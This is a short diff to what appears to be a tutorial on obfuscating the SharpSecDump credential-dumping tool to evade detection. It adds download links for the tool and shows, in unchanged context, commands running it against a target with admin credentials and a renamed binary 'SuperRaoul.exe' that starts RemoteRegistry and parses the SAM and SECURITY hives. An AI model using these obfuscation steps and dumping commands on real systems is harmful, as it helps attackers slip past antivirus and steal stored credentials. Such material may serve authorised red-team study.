@@ -44,7 +44,10 @@ Step 2. Go to the 'Project' section
 ------------------------------------------------------------------------------------------------------
 
 > Drag and drop the C# assembly file 'SharpSecDump.exe' that you want to obfuscate.
-   
+  URLs:
+  => https://github.com/G0ldenGunSec/SharpSecDump
+  => https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpSecDump.exe
+  
 > Fill-out the settings 'Base Directory' and 'Output Directory'.
 
 
@@ -215,6 +218,7 @@ SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=test.local
 
 
 C:\Users\Administrator\Desktop> SuperRaoul.exe -target=127.0.0.1
+
 [*] RemoteRegistry service started on 127.0.0.1
 [*] Parsing SAM hive on 127.0.0.1
 [*] Parsing SECURITY hive on 127.0.0.1
